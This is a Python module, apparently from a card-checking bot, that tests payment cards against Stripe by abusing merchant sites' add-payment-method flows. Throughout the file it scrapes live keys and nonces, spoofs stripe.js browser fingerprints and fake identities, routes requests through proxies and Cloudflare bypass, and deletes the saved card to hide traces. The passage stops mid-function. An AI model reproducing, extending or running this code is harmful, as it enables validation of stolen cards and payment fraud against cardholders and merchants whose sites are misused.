"""
Stripe Auth handler — payment method authorization via Stripe API.
Supports v1_with_cookie (standard) and v3_with_login (ProWritingAid login-based).
"""

import re
import base64
import json
import time
import random
import logging
import threading
from datetime import datetime, timedelta
from typing import Any, Dict, Optional, Tuple
from urllib.parse import urlparse

import requests
import cloudscraper
from lxml import html
from requests.adapters import HTTPAdapter

from core.session import REQUEST_TIMEOUT, _build_api_session, _apply_cookies
from core.geo import _fake
from core.proxy import _proxy_dict, ProxyConnectionError, is_proxy_error, categorize_proxy_error

logger = logging.getLogger(__name__)

APPROVED = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅"
DECLINED = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌"
ERROR = "𝙀𝙍𝙍𝙊𝙍 ⚠️"
SUCCESS = "𝙎𝙐𝘾𝘾𝞢𝙎𝙎 ✅"
FAILED = "𝙁𝘼𝙄𝙇𝙀𝘿 ❌"
INSUFFICIENT_FUNDS = "𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝙁𝙪𝙣𝙙𝙨 ☑️"
PASSAD = "𝙋𝘼𝙎𝙎𝙀𝘿 ❎"

_RE_PK_LIVE = re.compile(r'"publishableKey":"(pk_live_[^"]+)"')
_RE_ACCOUNT_ID = re.compile(r'"accountId":"(acct_[^"]+)"')
_RE_SETUP_NONCE = re.compile(r'"createSetupIntentNonce":"([^"]+)"')
_RE_CONFIRM_SETUP_NONCE = re.compile(r'"createAndConfirmSetupIntentNonce":"([^"]+)"')
_RE_ADD_PM_NONCE = re.compile(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"')
_RE_DELETE_PM = re.compile(r'delete-payment-method/(\d+)/\?_wpnonce=([a-f0-9]+)')
_RE_EMAIL = re.compile(r'"email":"([^"]+)"')
_RE_API_KEY = re.compile(r"ApiKey=([^\"&\s]+)")
_RE_WIDGET_ID = re.compile(r"WidgetId=([^\"&\s]+)")
_RE_WIDGET_ID_ALT = re.compile(r"Widget ID:\s*([^\"&\s]+)")
_RE_PK_LIVE_RAW = re.compile(r"pk_live_[A-Za-z0-9]+")
_RE_ERROR_MSG = re.compile(r":\s*(.*?)(?=\s*\(|$)")
_RE_BT_CLIENT_TOKEN = re.compile(r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]')


def _regex_find(pattern: re.Pattern, text: str) -> Optional[str]:
    """Return first group from *pattern* or None."""
    m = pattern.search(text)
    return m.group(1) if m else None


def _decode_bt_client_token(page: str) -> Optional[str]:
    """Extract fresh Braintree accessToken from the page-embedded client token.

    WooCommerce Braintree pages embed `wc_braintree_client_token` (base64
    JSON) whose `authorizationFingerprint` is a short-lived GraphQL Bearer
    token, fresher than any static map value. Returns None when absent.
    """
    try:
        m = _RE_BT_CLIENT_TOKEN.search(page or "")
        if not m:
            return None
        raw = m.group(1) + "=" * (-len(m.group(1)) % 4)
        data = json.loads(base64.b64decode(raw).decode("utf-8"))
        return data.get("authorizationFingerprint") or None
    except Exception as exc:
        logger.debug(f"BT client token decode skipped: {exc}")
        return None


def extract_payment_config(
    request_id: str,
    card_number: str,
    random_person: Dict,
    gateway_config: Dict,
    session: requests.Session,
) -> Dict[str, Any]:
    """Scrape the gateway page to extract Stripe/Braintree secrets."""
    result: Dict[str, Any] = {
        "nonce": None,
        "pk_live": None,
        "accountId": None,
        "createSetupIntentNonce": None,
        "email": None,
        "ApiKey": None,
        "widgetId": None,
        "client_token_fp": None,
        "http_status": None,
    }

    try:
        resp = session.get(gateway_config["url"], timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        result["http_status"] = resp.status_code
        session.cookies.update(resp.cookies)

        tree = html.fromstring(resp.content)
        nonce_nodes = tree.xpath('//input[@id="woocommerce-add-payment-method-nonce"]/@value')
        result["nonce"] = nonce_nodes[0] if nonce_nodes else None

        page = resp.text
        result["pk_live"] = _regex_find(_RE_PK_LIVE, page)
        result["accountId"] = _regex_find(_RE_ACCOUNT_ID, page)
        result["createSetupIntentNonce"] = _regex_find(_RE_SETUP_NONCE, page)
        result["email"] = _regex_find(_RE_EMAIL, page)
        result["ApiKey"] = _regex_find(_RE_API_KEY, page)
        result["widgetId"] = _regex_find(_RE_WIDGET_ID, page) or _regex_find(_RE_WIDGET_ID_ALT, page)
        result["client_token_fp"] = _decode_bt_client_token(page)

        return result

    except requests.RequestException as exc:
        is_pe, msg = is_proxy_error(exc, bool((gateway_config or {}).get("proxy")))
        if is_pe:
            logger.error(f"Proxy error in extract_payment_config: {categorize_proxy_error(exc)}")
            result["proxy_error"] = categorize_proxy_error(exc)
            return result
        resp_obj = getattr(exc, "response", None)
        if resp_obj is not None:
            result["http_status"] = getattr(resp_obj, "status_code", None)
        logger.error(f"Request failed in extract_payment_config: {exc}")
        return result
    except Exception as exc:
        logger.error(f"Unexpected error in extract_payment_config: {exc}")
        return result


def get_stripe_auth_id(
    random_person: Dict,
    card_info: Dict,
    publishable_key: str,
    account_id: str,
    url: str,
    gateway_config: Optional[Dict] = None,
) -> Any:
    """Create a Stripe PaymentMethod and return its ID (or False / PROXY_ERROR:…)."""
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    year_short = str(card_info["year"])[-2:]

    headers = {
        "User-Agent": random_person["user_agent"],
        "Accept": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
    }

    payload = {
        "type": "card",
        "billing_details[name]": f"{random_person['first_name']} {random_person['last_name']}",
        "card[number]": card_info["number"],
        "card[cvc]": card_info["cvv"],
        "card[exp_month]": card_info["month"],
        "card[exp_year]": year_short,
        "guid": str(_fake.uuid4()),
        "muid": str(_fake.uuid4()),
        "sid": str(_fake.uuid4()),
        "payment_user_agent": (
            f"stripe.js/{random.randint(280000000, 290000000)}; "
            f"stripe-js-v3/{random.randint(280000000, 290000000)}; card-element"
        ),
        "referrer": origin,
        "time_on_page": str(random.randint(120000, 240000)),
        "client_attribution_metadata[client_session_id]": str(_fake.uuid4()),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "key": publishable_key,
        "_stripe_account": account_id,
    }

    proxies = _proxy_dict(gateway_config) if gateway_config else None
    api_session = _build_api_session(proxies)

    try:
        resp = api_session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=payload,
            timeout=REQUEST_TIMEOUT,
        )
        resp.raise_for_status()
        pm_id = resp.json().get("id")
        return pm_id if pm_id else False
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in get_stripe_auth_id: {msg}")
            return f"PROXY_ERROR:{msg}"
        logger.error(f"Stripe PaymentMethod creation failed: {exc}")
        return False
    except Exception as exc:
        logger.error(f"Unexpected error in get_stripe_auth_id: {exc}")
        return False
    finally:
        api_session.close()


_LOGIN_CACHE_TTL = timedelta(hours=5)
_login_cache: Dict[str, Dict[str, Any]] = {}
_login_cache_lock = threading.Lock()


def _get_cached_login(login_email: str) -> Optional[Dict[str, Any]]:
    """Return cached login data if still valid, else None."""
    with _login_cache_lock:
        entry = _login_cache.get(login_email)
        if not entry:
            return None
        if datetime.now() - entry["ts"] > _LOGIN_CACHE_TTL:
            _login_cache.pop(login_email, None)
            logger.info(f"Login cache expired for {login_email}")
            return None
        logger.info(f"Login cache hit for {login_email}")
        return entry


def _set_cached_login(
    login_email: str,
    cookies: Dict[str, str],
    pk_live: str,
    origin: str,
    billing_url: str,
) -> None:
    """Store login session data in cache."""
    with _login_cache_lock:
        _login_cache[login_email] = {
            "cookies": cookies,
            "pk_live": pk_live,
            "origin": origin,
            "billing_url": billing_url,
            "ts": datetime.now(),
        }
    logger.info(f"Login session cached for {login_email}")


def _invalidate_cached_login(login_email: str) -> None:
    """Remove a login entry from cache."""
    with _login_cache_lock:
        _login_cache.pop(login_email, None)
    logger.info(f"Login cache invalidated for {login_email}")


def _stripe_auth_login_flow(
    card_info: Dict,
    random_person: Dict,
    gateway_config: Dict,
) -> Tuple[str, str]:
    """Full Stripe Auth v3_with_login pipeline with login session caching.

    Cached per login_email for 5 hours:
        - Authenticated cookies, pk_live, origin, billing_url
    Fresh per card check:
        - verification_token (from billing page)
        - client_secret / seti_id (from StripeIntentForAddingCard)
        - confirm payload with card data
    """
    login_data = gateway_config.get("login")
    if not login_data:
        return ERROR, "Login credentials missing in gateway config"

    login_email = login_data.get("email")
    login_password = login_data.get("password")
    if not login_email or not login_password:
        return ERROR, "Login email or password missing"

    site_url = gateway_config["url"]
    parsed = urlparse(site_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    billing_url = site_url

    proxies = _proxy_dict(gateway_config)

    def _build_login_session():
        if gateway_config.get("bypass_cloudscraper", False):
            s = cloudscraper.create_scraper()
        else:
            s = requests.Session()
            adapter = HTTPAdapter(pool_maxsize=5)
            s.mount("https://", adapter)
            s.mount("http://", adapter)
        if proxies:
            s.proxies = proxies
        s.headers.update({
            "User-Agent": random_person["user_agent"],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })
        return s

    session = _build_login_session()

    try:
        cached = _get_cached_login(login_email)
        pk_live = None
        verification_token = None
        used_cache = False

        if cached:
            for name, value in cached["cookies"].items():
                session.cookies.set(name, value)
            pk_live = cached["pk_live"]

            billing_resp = session.get(billing_url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
            billing_resp.raise_for_status()

            if "/Account/Login" in billing_resp.url:
                logger.info(f"Cached session expired for {login_email}, re-logging in")
                _invalidate_cached_login(login_email)
                cached = None
                session.close()
                session = _build_login_session()
            else:
                billing_tree = html.fromstring(billing_resp.content)
                token_nodes = billing_tree.xpath('//input[@name="__RequestVerificationToken"]/@value')
                if token_nodes:
                    verification_token = token_nodes[0]
                    used_cache = True
                    logger.info(f"Reusing cached login for {login_email} – skipped login")
                else:
                    _invalidate_cached_login(login_email)
                    cached = None
                    session.close()
                    session = _build_login_session()

        if not used_cache:
            resp = session.get(billing_url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
            resp.raise_for_status()

            tree = html.fromstring(resp.content)

            token_nodes = tree.xpath('//input[@name="__RequestVerificationToken"]/@value')
            verification_token = token_nodes[0] if token_nodes else None
            if not verification_token:
                return ERROR, "Failed to extract verification token from login page"

            login_url = f"{origin}/en/Account/Login3?returnUrl=/en/Payment/Billing?tab=methods"
            login_payload = {
                "ReturnUrl": "/en/Payment/Billing?tab=methods",
                "__RequestVerificationToken": verification_token,
                "UserName": login_email,
                "Password": login_password,
            }

            session.headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": origin,
                "Referer": resp.url,
            })

            login_resp = session.post(
                login_url, data=login_payload,
                timeout=REQUEST_TIMEOUT, allow_redirects=True,
            )
            login_resp.raise_for_status()

            if "/Account/Login" in login_resp.url:
                return FAILED, "Login failed – invalid credentials"

            if "Billing" not in login_resp.url:
                billing_resp = session.get(billing_url, timeout=REQUEST_TIMEOUT)
                billing_resp.raise_for_status()
            else:
                billing_resp = login_resp

            billing_tree = html.fromstring(billing_resp.content)

            pk_nodes = billing_tree.xpath('//input[@name="StripePublicApiKey"]/@value')
            if not pk_nodes:
                pk_match = _RE_PK_LIVE_RAW.search(billing_resp.text)
                pk_live = pk_match.group(0) if pk_match else None
            else:
                pk_live = pk_nodes[0]

            if not pk_live:
                return ERROR, "Failed to extract pk_live from billing page"

            token_nodes = billing_tree.xpath('//input[@name="__RequestVerificationToken"]/@value')
            if token_nodes:
                verification_token = token_nodes[0]
            else:
                return ERROR, "Failed to extract verification token from billing page"

            cookies_dict = {c.name: c.value for c in session.cookies}
            _set_cached_login(login_email, cookies_dict, pk_live, origin, billing_url)

        intent_url = f"{origin}/en/Payment/StripeIntentForAddingCard"
        session.headers.update({
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": billing_url,
            "__requestverificationtoken": verification_token,
        })

        intent_resp = session.post(intent_url, data="", timeout=REQUEST_TIMEOUT)
        intent_resp.raise_for_status()

        try:
            intent_data = intent_resp.json()
        except (json.JSONDecodeError, ValueError):
            return ERROR, "Failed to parse SetupIntent response"

        client_secret = intent_data.get("clientSecret")
        if not client_secret:
            return ERROR, "Failed to get SetupIntent client_secret"

        seti_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else None
        if not seti_id:
            return ERROR, "Failed to parse SetupIntent ID"

        year_short = str(card_info["year"])[-2:]

        stripe_headers = {
            "User-Agent": random_person["user_agent"],
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
        }

        confirm_payload = {
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_info["number"],
            "payment_method_data[card][cvc]": card_info["cvv"],
            "payment_method_data[card][exp_month]": card_info["month"],
            "payment_method_data[card][exp_year]": year_short,
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][postal_code]": random_person["zipcode"],
            "payment_method_data[guid]": str(_fake.uuid4()),
            "payment_method_data[muid]": str(_fake.uuid4()),
            "payment_method_data[sid]": str(_fake.uuid4()),
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": (
                f"stripe.js/{random.randint(280000000, 290000000)}; "
                f"stripe-js-v3/{random.randint(280000000, 290000000)}; payment-element"
            ),
            "payment_method_data[referrer]": f"{origin}/en/Payment/Billing?tab=methods",
            "payment_method_data[time_on_page]": str(random.randint(120000, 240000)),
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": pk_live,
            "client_secret": client_secret,
        }

        confirm_url = f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm"

        api_session = _build_api_session(proxies)
        try:
            confirm_resp = api_session.post(
                confirm_url, data=confirm_payload,
                headers=stripe_headers, timeout=REQUEST_TIMEOUT,
            )
        finally:
            api_session.close()

        try:
            confirm_data = confirm_resp.json()
        except (json.JSONDecodeError, ValueError):
            return ERROR, "Failed to parse Stripe confirm response"

        si_status = confirm_data.get("status")

        if si_status == "succeeded":
            pm_id = confirm_data.get("payment_method")
            delete_msg = ""

            if pm_id:
                try:
                    add_url = f"{origin}/en/Payment/StripeAddPaymentMethod"
                    session.headers.update({
                        "Accept": "application/json, text/javascript, */*; q=0.01",
                        "Content-Type": "application/json; charset=UTF-8",
                        "X-Requested-With": "XMLHttpRequest",
                        "__requestverificationtoken": verification_token,
                    })
                    add_resp = session.post(
                        add_url,
                        data=json.dumps({"PaymentMethodId": pm_id}),
                        timeout=REQUEST_TIMEOUT,
                    )
                    add_resp.raise_for_status()
                except Exception as exc:
                    logger.warning(f"StripeAddPaymentMethod failed: {exc}")

                try:
                    del_billing = session.get(billing_url, timeout=REQUEST_TIMEOUT)
                    del_billing.raise_for_status()
                    del_tree = html.fromstring(del_billing.content)

                    del_token_nodes = del_tree.xpath('//input[@name="__RequestVerificationToken"]/@value')
                    del_token = del_token_nodes[0] if del_token_nodes else verification_token

                    card_id = None
                    m = re.search(r'DeleteCustomerCard\?cardId=(\d+)', del_billing.text)
                    if m:
                        card_id = m.group(1)
                    else:
                        cid_nodes = del_tree.xpath('//*[@data-card-id]/@data-card-id')
                        if cid_nodes:
                            card_id = cid_nodes[0]

                    if not card_id:
                        logger.warning("Could not find numeric card ID on billing page")
                        delete_msg = " (error delete)"
                    else:
                        del_url = f"{origin}/en/Payment/DeleteCustomerCard"
                        session.headers.update({
                            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "X-Requested-With": "XMLHttpRequest",
                            "Accept": "*/*",
                            "Referer": billing_url,
                        })
                        session.headers.pop("__requestverificationtoken", None)
                        del_resp = session.post(
                            del_url,
                            data={"cardId": card_id, "__RequestVerificationToken": del_token},
                            timeout=REQUEST_TIMEOUT,
                        )
                        del_resp.raise_for_status()
                        delete_msg = ""
                except Exception as exc:
                    logger.warning(f"DeleteCustomerCard failed: {exc}")
                    delete_msg = " (error delete)"

            cookies_dict = {c.name: c.value for c in session.cookies}
            _set_cached_login(login_email, cookies_dict, pk_live, origin, billing_url)

            return SUCCESS, f"Approved{delete_msg}"

        if si_status == "requires_action":
            next_action = confirm_data.get("next_action", {})
            action_type = next_action.get("type", "unknown")
            return PASSAD, f"Challenge Required ({action_type})"

        error_obj = confirm_data.get("error", {})
        if error_obj:
            err_msg = error_obj.get("message", "Unknown error")
            decline_code = error_obj.get("decline_code")
            if decline_code:
                if decline_code == "insufficient_funds":
                    return INSUFFICIENT_FUNDS, "Insufficient Funds"
                err_msg = f"{err_msg} ({decline_code.replace('_', ' ').title()})"
            return FAILED, err_msg

        return FAILED, f"Setup intent status: {si_status or 'unknown'}"

    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in stripe_auth_login_flow: {msg}")
            return ERROR, msg
        logger.error(f"Request error in stripe_auth_login_flow: {exc}")
        return ERROR, f"Request failed: {exc}"
    except Exception as exc:
        logger.error(f"Unexpected error in stripe_auth_login_flow: {exc}")
        return ERROR, f"Processing failed: {exc}"
    finally:
        try:
            session.close()
        except Exception:
            pass


def _proxy_error_result(token_or_config) -> Optional[Tuple[bool, str, None]]:
    """If *token_or_config* is a PROXY_ERROR string, return error tuple."""
    if isinstance(token_or_config, str) and token_or_config.startswith("PROXY_ERROR:"):
        return False, token_or_config.replace("PROXY_ERROR:", ""), None
    return None


def _check_required_fields(gateway_config: Dict, fields: list) -> Optional[str]:
    """Return missing field name or None if all present."""
    for f in fields:
        if f not in gateway_config:
            return f
    return None


def handle_stripe_auth(card_info: Dict, person: Dict, gateway_config: Dict) -> Tuple[str, str]:
    """Main entry point for Stripe Auth processing.

    Routes to login-based flow or standard flow based on version config.
    """
    version = gateway_config.get("version", "")
    gateway_type = gateway_config.get("gateway_type", "")

    if "with_login" in version:
        return _stripe_auth_login_flow(card_info, person, gateway_config)

    if "v4_with_cookies" in version:
        return _stripe_wc_deferred_flow(card_info, person, gateway_config)

    secrets = extract_payment_config(None, card_info["number"], person, gateway_config, _build_dummy_session(gateway_config, person))

    if secrets.get("proxy_error"):
        return ERROR, secrets["proxy_error"]

    pk_live = secrets.get("pk_live")
    if not pk_live:
        return ERROR, "Failed to fetch pk_live"

    account_id = secrets.get("accountId")
    if not account_id:
        return ERROR, "Failed to fetch accountId"

    email = secrets.get("email")
    if not email:
        return ERROR, "Failed to fetch email"

    if "v1_with_cookie" in version:
        missing = _check_required_fields(gateway_config, ["cookies", "url", "post_url"])
        if missing:
            return ERROR, f"{missing} is missing in gateway config"

        nonce = secrets.get("nonce")
        if not nonce:
            return ERROR, "Failed to fetch nonce"

        ajax_nonce = secrets.get("createSetupIntentNonce")
        if not ajax_nonce:
            return ERROR, "Failed to fetch ajax nonce"

        payment_id = get_stripe_auth_id(
            person, card_info, pk_live, account_id, gateway_config["url"], gateway_config
        )

        err = _proxy_error_result(payment_id)
        if err:
            return ERROR, err[1]
        if not payment_id:
            return DECLINED, "Your card was rejected from the gateway"

        from core.session import SessionManager
        session_mgr = SessionManager()
        req_id = session_mgr.create_request_id()
        session = session_mgr.get_session(req_id, gateway_config, person)

        try:
            payload = {
                "action": "create_setup_intent",
                "wcpay-payment-method": payment_id,
                "_ajax_nonce": ajax_nonce,
            }

            resp = session.post(
                url=gateway_config["post_url"],
                data=payload,
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT,
            )
            session.cookies.update(resp.cookies)

            status, message = _parse_payment_response(req_id, card_info, person, gateway_config, session, resp.content)
            session_mgr.cleanup_session(req_id)
            return status, message
        except requests.RequestException as exc:
            is_pe, _ = is_proxy_error(exc)
            if is_pe:
                return ERROR, categorize_proxy_error(exc)
            return ERROR, f"Request failed: {exc}"
        except Exception as exc:
            return ERROR, f"Processing failed: {exc}"
        finally:
            try:
                session_mgr.cleanup_session(req_id)
            except Exception:
                pass

    return ERROR, f"Unsupported Stripe Auth version: {version}"


def _cookie_expiry_hours(cookies) -> Optional[float]:
    """Remaining lifetime of a WordPress logged-in cookie, if decodable.

    Format is PLAINTEXT (not encrypted): username|expiration|token|hmac.
    Only the hmac is keyed (HMAC-SHA256 with server secrets), so expiry can
    be *read* but never forged/extended client-side.
    """
    try:
        items = cookies if isinstance(cookies, list) else []
        for c in items:
            name = (c.get("name") or "")
            if name.startswith("wordpress_logged_in_"):
                parts = (c.get("value") or "").split("|")
                if len(parts) >= 2 and parts[1].isdigit():
                    import time as _t
                    return (int(parts[1]) - _t.time()) / 3600.0
        return None
    except Exception:
        return None


def _stripe_wc_deferred_flow(card_info: Dict, person: Dict, gateway_config: Dict) -> Tuple[str, str]:
    """WooCommerce Stripe-gateway deferred SetupIntent flow (cookies session).

    Sites like cariboucoffee.com: Stripe Payment Element tokenizes the card
    (POST api.stripe.com/v1/payment_methods -> pm_id), then the merchant
    confirms a SetupIntent (POST admin-ajax.php
    wc_stripe_create_and_confirm_setup_intent), then the method is saved via
    the add-payment-method form and deleted again for cleanup.

    Result mapping: added -> SUCCESS/Approved; requires_action/3DS ->
    PASSAD; declined incl. wrong CVC -> FAILED with gateway message.
    """
    missing = _check_required_fields(gateway_config, ["cookies", "url"])
    if missing:
        return ERROR, f"{missing} is missing in gateway config"

    hours_left = _cookie_expiry_hours(gateway_config.get("cookies"))
    if hours_left is not None and hours_left < 48:
        logger.warning(f"Stripe WC cookies expire in ~{hours_left:.1f}h — refresh them soon")

    from core.session import SessionManager
    session_mgr = SessionManager()
    req_id = session_mgr.create_request_id()
    session = session_mgr.get_session(req_id, gateway_config, person)
    origin = f"{urlparse(gateway_config['url']).scheme}://{urlparse(gateway_config['url']).netloc}"

    try:
        # 1) Page -> nonces + pk_live (logged-in cookies required)
        try:
            page = session.get(gateway_config["url"], timeout=REQUEST_TIMEOUT)
            page.raise_for_status()
        except requests.RequestException as exc:
            is_pe, _ = is_proxy_error(exc)
            if is_pe:
                return ERROR, categorize_proxy_error(exc)
            return ERROR, f"Request failed: {exc}"
        html_text = page.text or ""
        if 'name="username"' in html_text and 'woocommerce-login-nonce' in html_text \
                and "customer-logout" not in html_text and "Log out" not in html_text:
            return ERROR, "Session expired, update cookies in GitHub"
        add_nonce = _regex_find(_RE_ADD_PM_NONCE, html_text)
        ajax_nonce = _regex_find(_RE_CONFIRM_SETUP_NONCE, html_text)
        pk_live = _regex_find(_RE_PK_LIVE, html_text)
        if not pk_live:
            m = _RE_PK_LIVE_RAW.search(html_text)
            pk_live = m.group(0) if m else None
        if not add_nonce or not ajax_nonce or not pk_live:
            return ERROR, "Failed to extract page secrets (nonce/pk_live)"

        # 2) Tokenize card at Stripe
        year_short = str(card_info["year"])[-2:]
        holder = f"{person.get('first_name', 'Test')} {person.get('last_name', 'User')}"
        pm_payload = {
            "type": "card",
            "billing_details[name]": holder,
            "billing_details[email]": person.get("email", ""),
            "billing_details[phone]": person.get("phone", ""),
            "billing_details[address][country]": "US",
            "billing_details[address][city]": person.get("city", "New York"),
            "billing_details[address][state]": person.get("state", "NY"),
            "billing_details[address][postal_code]": person.get("zipcode", "10001"),
            "card[number]": card_info["number"],
            "card[cvc]": card_info["cvv"],
            "card[exp_month]": str(card_info["month"]).zfill(2),
            "card[exp_year]": year_short,
            "allow_redisplay": "unspecified",
            "pasted_fields": "number",
            "payment_user_agent": (
                f"stripe.js/{random.randint(280000000, 290000000)}; "
                f"stripe-js-v3/{random.randint(280000000, 290000000)}; payment-element; deferred-intent"
            ),
            "referrer": origin,
            "time_on_page": str(random.randint(30000, 90000)),
            "key": pk_live,
        }
        proxies = _proxy_dict(gateway_config)
        api_session = _build_api_session(proxies)
        try:
            pm_resp = api_session.post(
                "https://api.stripe.com/v1/payment_methods",
                headers={"User-Agent": person["user_agent"], "Accept": "application/json",
                         "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/"},
                data=pm_payload, timeout=REQUEST_TIMEOUT,
            )
        finally:
            api_session.close()
        try:
            pm_data = pm_resp.json()
        except (json.JSONDecodeError, ValueError):
            return ERROR, f"Stripe tokenize failed (HTTP {pm_resp.status_code})"
        if pm_data.get("error"):
            return FAILED, pm_data["error"].get("message", "Card rejected")
        pm_id = pm_data.get("id")
        if not pm_id:
            return FAILED, "Card rejected (no payment method)"

        # 3) Confirm SetupIntent via merchant ajax
        try:
            si_resp = session.post(
                f"{origin}/wp-admin/admin-ajax.php",
                data={"action": "wc_stripe_create_and_confirm_setup_intent",
                      "wc-stripe-payment-method": pm_id,
                      "wc-stripe-payment-type": "card",
                      "_ajax_nonce": ajax_nonce},
                headers={"X-Requested-With": "XMLHttpRequest", "Referer": gateway_config["url"]},
                timeout=REQUEST_TIMEOUT,
            )
        except requests.RequestException as exc:
            is_pe, _ = is_proxy_error(exc)
            if is_pe:
                return ERROR, categorize_proxy_error(exc)
            return ERROR, f"Request failed: {exc}"
        try:
            si_data = si_resp.json()
        except (json.JSONDecodeError, ValueError):
            return ERROR, "Failed to parse SetupIntent response"
        if si_data.get("success") is True:
            si = si_data.get("data", {}) or {}
            seti_id = si.get("id", "")
            if si.get("status") == "succeeded":
                # 4) Save method to account (proves it sticks)
                try:
                    session.post(
                        gateway_config["url"],
                        data={"payment_method": "stripe", "wc-stripe-new-payment-method": "true",
                              "woocommerce-add-payment-method-nonce": add_nonce,
                              "_wp_http_referer": "/my-account/add-payment-method/",
                              "woocommerce_add_payment_method": "1",
                              "wc-stripe-payment-method": pm_id,
                              "wc-stripe-setup-intent": seti_id},
                        allow_redirects=True, timeout=REQUEST_TIMEOUT)
                except requests.RequestException:
                    pass
                _stripe_wc_cleanup(session, origin)
                return SUCCESS, "Approved"
            if si.get("status") == "requires_action" or si.get("next_action"):
                _stripe_wc_cleanup(session, origin)
                return PASSAD, "Challenge Required (3DS)"
            _stripe_wc_cleanup(session, origin)
            return FAILED, f"Setup intent status: {si.get('status') or 'unknown'}"
        err = (si_data.get("data", {}) or {}).get("error", {}) or {}
        msg = err.get("message", "Card declined") if isinstance(err, dict) else str(err)
        code = err.get("decline_code", "") if isinstance(err, dict) else ""
        if code == "insufficient_funds":
            return INSUFFICIENT_FUNDS, "Insufficient Funds"
        if code:
            msg = f"{msg} ({code.replace('_', ' ').title()})"
        return FAILED, msg
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            return ERROR, categorize_proxy_error(exc)
        return ERROR, f"Request failed: {exc}"
    except Exception as exc:
        logger.error(f"Unexpected error in stripe_wc_deferred_flow: {exc}")
        return ERROR, f"Processing failed: {exc}"
    finally:
        try:
            session_mgr.cleanup_session(req_id)
        except Exception:
            pass


def _stripe_wc_cleanup(session: requests.Session, origin: str) -> None:
    """Best-effort delete of saved methods on WooCommerce payment-methods page."""
    try:
        resp = session.get(f"{origin}/my-account/payment-methods/", timeout=REQUEST_TIMEOUT)
        for mid, nonce in _RE_DELETE_PM.findall(resp.text or ""):
            try:
                session.get(f"{origin}/my-account/delete-payment-method/{mid}/?_wpnonce={nonce}",
                            timeout=REQUEST_TIMEOUT)
            except requests.RequestException:
                pass
    except Exception as exc:
        logger.debug(f"Stripe WC cleanup skipped: {exc}")


def _build_dummy_session(gateway_config: Dict, random_person: Dict) -> requests.Session:
    """Build a basic session for scraping the gateway page when we don't have a SessionManager."""
    parsed = urlparse(gateway_config["url"])
    origin = f"{parsed.scheme}://{parsed.netloc}"

    if gateway_config.get("bypass_cloudscraper", False):
        session = cloudscraper.create_scraper()
    else:
        session = requests.Session()
        adapter = HTTPAdapter(pool_maxsize=5)
        session.mount("https://", adapter)
        session.mount("http://", adapter)

    proxy_url = None
    from core.proxy import parse_proxy
    raw_proxy = gateway_config.get("proxy")
    if raw_proxy:
        proxy_url = parse_proxy(raw_proxy)
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    session.headers.update({
        "User-Agent": random_person["user_agent"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "Origin": origin,
        "Referer": gateway_config["url"],
    })

    try:
        resp = session.get(origin, timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        session.cookies.update(resp.cookies)
        _apply_cookies(session, gateway_config)
    except Exception as exc:
        logger.warning(f"Dummy session warmup failed: {exc}")

    return session


def _parse_payment_response(
    request_id: str,
    card_info: Dict,
    random_person: Dict,
    gateway_config: Dict,
    session: requests.Session,
    content: bytes,
) -> Tuple[str, str]:
    """Interpret the gateway response (JSON or HTML) and return (status, message)."""
    try:
        try:
            data = json.loads(content)

            if "proxy_error" in data:
                return ERROR, data["proxy_error"]

            if data.get("status") == "succeeded":
                return SUCCESS, "Succeeded"

            if data.get("status") == "requires_action":
                return PASSAD, "Challenge Required"

            if data.get("success") is True:
                return SUCCESS, "Approved"

            error_message = "Unknown error"

            if "error" in data:
                err_obj = data["error"]
                error_message = err_obj.get("message", "Unknown error")
                decline_code = err_obj.get("decline_code")
                if decline_code:
                    if decline_code == "insufficient_funds":
                        return INSUFFICIENT_FUNDS, "Insufficient Funds"
                    error_message = f"{error_message} ({decline_code.replace('_', ' ').title()})"
